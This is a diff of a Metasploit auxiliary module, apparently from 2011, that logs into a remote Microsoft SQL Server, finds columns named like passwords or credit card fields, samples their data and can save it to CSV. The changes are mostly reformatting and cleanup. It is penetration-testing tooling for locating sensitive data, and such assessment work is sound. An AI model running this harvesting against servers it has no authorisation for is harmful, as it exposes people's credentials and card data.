@@ -1,14 +1,14 @@
 ##
-#  mssql_FindandSampleData.rb 
+# $Id: mssql_FindandSampleData.rb  9653 2011-11-15 23:33:07Z nullbind $
 ##
-#  Version: 1.0
-#  Date: 11.06.2011
-#  Author: nullbind (scott.sutherland@netspi.com)
+
 ##
 #  Credits: 
 #  Thank you Dijininja for your original IDF 
 #  module.  Also, thank you  humble-desser and DarkOperator
 #  helping me work through a few critical issues.
+##
+
 ## 
 #  Use Case:
 #  This script will search through all of the non-default 
@@ -27,18 +27,6 @@
 #
 #  Important note: This script only works on SQL Server 2005 and 2008
 ##
-# TODO
-# 1 - Add option to use domain credentials to auth
-#	  o This most likely works natively already, but I dont know how yet.
-#       I tried to simply set the "domain" advanced option, but that seem to work right.
-# 2 - Add ability to query named instances from IP - want to do the following:
-#	  o step 1 - enumerate instances on each ip and add ip\\instance to array
-#     o step 2 - connect to and query each instance
-# 3 - Add how to use a list of IPs from file to the description 
-# 4 - Add IP address, instance name, and version of db to output file/display
-# 5 - Does not have option to dynamically generate target list from osql
-##
-
 
 require 'msf/core'
 
@@ -52,28 +40,25 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'           => 'Microsoft SQL Server - Find and Sample Data',
-			'Description'    => %q{
-				This script will search through all of the non-default 
-				databases on the SQL Server for columns that match the 
-				keywords defined in the TSQL KEYWORDS option. If column 
-				names are found that match the defined keywords and 
-				data is present in the associated tables, the script 
-				will select a sample of the records from each 
-				of the affected tables.  The sample size is determined
-				by the SAMPLESIZE option.  Also, the results can be written to a
-				CSV file if the OUTPUT is set to "yes" and an OUTPUTPATH option is set.
+			'Description'    => %q{This script will search through all of the non-default databases 
+			on the SQL Server for columns that match the keywords defined in the TSQL KEYWORDS 
+			option. If column names are found that match the defined keywords and data is present 
+			in the associated tables, the script will select a sample of the records from each of 
+			the affected tables.  The sample size is determined by the SAMPLESIZE option.  Also, 
+			the results can be written to a CSV file if the OUTPUT is set to "yes" and the 
+			OUTPUTPATH option is set.
 			},
 			'Author'         => [ 'Scot Sutherland (nullbind) <scott.sutherland@netspi.com>' ],
-			'Version'        => 'Revision: 1.0',			
+			'Version'        => '$Revision: 1 $',		
 			'References'     => [[ 'URL', 'http://www.netspi.com/blog/author/ssutherland/' ]],			
 			'Targets'        => [[ 'MSSQL 2005', { 'ver' => 2005 }]]
 		))
 
 		register_options(
 			[
-				OptString.new('KEYWORDS', [ true, 'Column names to search for and sample (keyword1|keyword2|keyword3)',  'passw|credit|card']),
+				OptString.new('KEYWORDS', [ true, 'Keywords to search for','passw|credit|card']),
 				OptString.new('SAMPLESIZE', [ true, 'Number of rows to sample',  '1']),
-				OptString.new('OUTPUT', [ false, 'Generate CSV file from search results (YES|NO)',  'NO']),
+				OptString.new('OUTPUT', [ false, 'Generate CSV file from search results',  'no']),
 				OptString.new('OUTPUTPATH', [ false, 'File output path (C:\\\filename.csv)',  '']),
 			], self.class)
 	end
@@ -108,13 +93,13 @@ class Metasploit3 < Msf::Auxiliary
 			-- SETUP UP SAMPLE SIZE
 			--------------------------------------------------
 			DECLARE @SAMPLE_COUNT varchar(MAX);
-			SET @SAMPLE_COUNT = 1;
+			SET @SAMPLE_COUNT = #{opt_sample};
 
 			--------------------------------------------------
 			-- SETUP KEYWORDS TO SEARCH
 			--------------------------------------------------
 			DECLARE @KEYWORDS varchar(MAX);	
-			SET @KEYWORDS = 'pass|credit|ssn|';
+			SET @KEYWORDS = '#{opt_keywords}|';
 			
 			--------------------------------------------------
 			--SETUP WHERE STATEMENT CONTAINING KEYWORDS
@@ -142,8 +127,7 @@ class Metasploit3 < Msf::Auxiliary
 						-- REMOVE PROCESSED KEYWORD
 						SET @KEYWORDS = SUBSTRING(@KEYWORDS,@change+1,LEN(@KEYWORDS));
 						
-					END
-			    		
+					END			    		
 				-- REMOVE UNEEDED 					
 				SELECT @SEARCH_TERMS = SUBSTRING(@SEARCH_TERMS,0,LEN(@SEARCH_TERMS)-2);
 
@@ -222,13 +206,12 @@ class Metasploit3 < Msf::Auxiliary
 				END   
 				CLOSE MY_CURSOR1
 				DEALLOCATE MY_CURSOR1
-
-				 -------------------------------------------------
-				 -- CURSOR2
-				 -- TAKE A X RECORD SAMPLE FROM EACH OF THE COLUMNS
-				 -- THAT MATCH THE DEFINED KEYWORDS
-				 -- NOTE: THIS WILL NOT SAMPLE EMPTY TABLES
-				 -------------------------------------------------
+				-------------------------------------------------
+				-- CURSOR2
+				-- TAKE A X RECORD SAMPLE FROM EACH OF THE COLUMNS
+				-- THAT MATCH THE DEFINED KEYWORDS
+				-- NOTE: THIS WILL NOT SAMPLE EMPTY TABLES
+				-------------------------------------------------
 				
 				IF (SELECT COUNT(*) FROM ##mytable) < 1
 					BEGIN	
@@ -247,7 +230,8 @@ class Metasploit3 < Msf::Auxiliary
 						
 						DECLARE MY_CURSOR2 CURSOR
 						FOR
-						SELECT server_name,database_name,table_schema,table_name,column_name,column_data_type FROM ##mytable
+						SELECT server_name,database_name,table_schema,table_name,column_name,column_data_type
+						FROM ##mytable
 
 							OPEN MY_CURSOR2
 							FETCH NEXT FROM MY_CURSOR2 INTO @var_server,@var_database,@var_table_schema,@var_table,@var_column,@var_column_data_type
@@ -266,8 +250,8 @@ class Metasploit3 < Msf::Auxiliary
 							
 							-- SETUP AND EXECUTE THE COLUMN DATA ROW COUNT QUERY
 							SET @mycount_query = 'INSERT INTO #mycount SELECT DISTINCT 
-												  COUNT('+@var_column+') FROM '+@var_database+'.
-												  '+@var_table_schema+'.'+@var_table;
+												COUNT('+@var_column+') FROM '+@var_database+'.
+												'+@var_table_schema+'.'+@var_table;
 							EXEC(@mycount_query);
 
 							-- SET THE COLUMN DATA ROW COUNT
@@ -313,12 +297,25 @@ class Metasploit3 < Msf::Auxiliary
 						-----------------------------------
 						IF (SELECT @SAMPLE_COUNT)= 1
 							BEGIN
-								SELECT DISTINCT cast(server_name as CHAR) as server_name,cast(database_name as char) as database_name,cast(table_schema as char) as table_schema,cast(table_name as char) as table_schema,cast(column_name as char) as column_name,cast(column_data_type as char) as column_data_type,cast(column_value as char) as column_data_sample,cast(column_data_row_count as char) as column_data_row_count FROM ##mytable2 --ORDER BY server_name,database_name,table_schema,table_name,column_name,column_value asc
-								
+								SELECT DISTINCT cast(server_name as CHAR) as server_name,
+								cast(database_name as char) as database_name,
+								cast(table_schema as char) as table_schema,
+								cast(table_name as char) as table_schema,
+								cast(column_name as char) as column_name,
+								cast(column_data_type as char) as column_data_type,
+								cast(column_value as char) as column_data_sample,
+								cast(column_data_row_count as char) as column_data_row_count FROM ##mytable2 								
 							END	
 						ELSE
 							BEGIN
-								SELECT DISTINCT cast(server_name as CHAR) as server_name,cast(database_name as char) as database_name,cast(table_schema as char) as table_schema,cast(table_name as char) as table_schema,cast(column_name as char) as column_name,cast(column_data_type as char) as column_data_type,cast(column_value as char) as column_data_sample,cast(column_data_row_count as char) as column_data_row_count FROM ##mytable2 --ORDER BY server_name,database_name,table_schema,table_name,column_name,column_value asc							
+								SELECT DISTINCT cast(server_name as CHAR) as server_name,
+								cast(database_name as char) as database_name,
+								cast(table_schema as char) as table_schema,
+								cast(table_name as char) as table_schema,
+								cast(column_name as char) as column_name,
+								cast(column_data_type as char) as column_data_type,
+								cast(column_value as char) as column_data_sample,
+								cast(column_data_row_count as char) as column_data_row_count FROM ##mytable2 							
 							END
 					END
 			-----------------------------------
@@ -333,10 +330,13 @@ class Metasploit3 < Msf::Auxiliary
 				----------------------------------------------------------------------
 				-- RETURN ERROR MESSAGES IF THERE ARE NOT DATABASES TO ACCESS
 				----------------------------------------------------------------------
-				IF (SELECT count(*) FROM master..sysdatabases WHERE name NOT IN ('master','tempdb','model','msdb')) < 1	
+				IF (SELECT count(*) FROM master..sysdatabases 
+				WHERE name NOT IN ('master','tempdb','model','msdb')) < 1	
 					SELECT 'No non-default databases exist to search.' as Message;
 				ELSE
-					SELECT 'Non-default databases exist, but the current user does not have the privileges to access them.' as Message;				
+					SELECT 'Non-default databases exist, 
+					but the current user does not have 
+					the privileges to access them.' as Message;				
 				END
 		END
 		else
@@ -348,31 +348,15 @@ class Metasploit3 < Msf::Auxiliary
 		
 		#STATUSING
 		puts " " 
-		puts "[*] STATUS: Attempting to connect to the remote SQL Server at #{rhost}"
+		puts "[*] STATUS: Attempting to connect to the remote SQL Server at #{rhost}..."
 		
 		#CREATE DATABASE CONNECTION AND SUBMIT QUERY WITH ERROR HANDLING
 		begin
 			result = mssql_query(sql, false) if mssql_login_datastore
 			column_data = result[:rows]
-			puts "[*] STATUS: Connected to the remote SQL Server."
-			
-			# testing instance stuff
-			#Grabs the Instance Name and Version of MSSQL(2k,2k5,2k8)
-			#instancename= mssql_query(mssql_enumerate_servername())[:rows][0][0].split('\\')[1]
-			#print_status("Instance Name: #{instancename.inspect}")
-            #version = mssql_query(mssql_sql_info())[:rows][0][0]
-			#version_year = version.split('-')[0].slice(/\d\d\d\d/)
- 
-		rescue
+			puts "[*] STATUS: Connected to the remote SQL Server."			
+			rescue
 			puts "[-] ERROR : Connection to #{rhost} failed."  
-			#puts "[-]  Common issues include:"
-			#puts "[-] 	The system is down"
-			#puts "[-] 	The SQL Server service is stopped"
-			#puts "[-] 	The wrong IP was used"
-			#puts "[-] 	A bad username or password was used"
-			#puts "[-] 	A bad instance name was used"
-			#puts "[-]  Windows account used, but Win auth not enabled
-			#puts "[-] -----------------------------------------------"
 			return
 		end
 
@@ -398,9 +382,8 @@ class Metasploit3 < Msf::Auxiliary
 		#SETUP ROW WIDTHS
 		widths = [0, 0, 0, 0, 0, 0, 0, 0]		
 		(column_data|headings).each { |row|
-			0.upto(7) { |col|	
-				#puts "width position: #{widths[col]} COLUMN SIZE: #{row[col].strip.to_s.length}"
-				widths[col] = row[col].to_s.length if row[col].to_s.length > widths[col] #not working right because something is setting the data column widthds to 30
+			0.upto(7) { |col|				
+				widths[col] = row[col].to_s.length if row[col].to_s.length > widths[col] 
 			}
 		}		
 		
@@ -413,7 +396,8 @@ class Metasploit3 < Msf::Auxiliary
 				buffer2 += row[col]+ ","
 			}
 			print_line(buffer1)	
-			File.open(opt_outputpath, 'a') do |myfile| myfile.puts(buffer2.chomp(",")) end if (opt_ouput.downcase == "yes" and opt_outputpath.downcase != "")			
+			File.open(opt_outputpath, 'a') do |myfile| myfile.puts(buffer2.chomp(",")) 
+			end if (opt_ouput.downcase == "yes" and opt_outputpath.downcase != "")			
 		}
 		
 		#PRINT DIVIDERS
@@ -440,7 +424,8 @@ class Metasploit3 < Msf::Auxiliary
 			
 			# Write query output to the defined file path (currently Windows Only)
 			# Note: This will overwrite existing files
-			File.open(opt_outputpath, 'a') do |myfile| myfile.puts(buffer2.chomp(",")) end if (opt_ouput.downcase == "yes" and opt_outputpath.downcase != "")
+			File.open(opt_outputpath, 'a') do |myfile| myfile.puts(buffer2.chomp(",")) 
+			end if (opt_ouput.downcase == "yes" and opt_outputpath.downcase != "")
 			buffer1 = ""
 			buffer2 = ""
 			print_line(buffer1)						
@@ -451,7 +436,7 @@ class Metasploit3 < Msf::Auxiliary
 		if File.exist?(opt_outputpath) 
 			puts "[*] The query output from #{rhost} has been written to: #{opt_outputpath}"
 		else
-			puts "[*] The query output from #{rhost} was NOT written to: #{opt_outputpath}"
+			puts "[*] The query output from #{rhost} was NOT written to a file."
 		end
 		
 
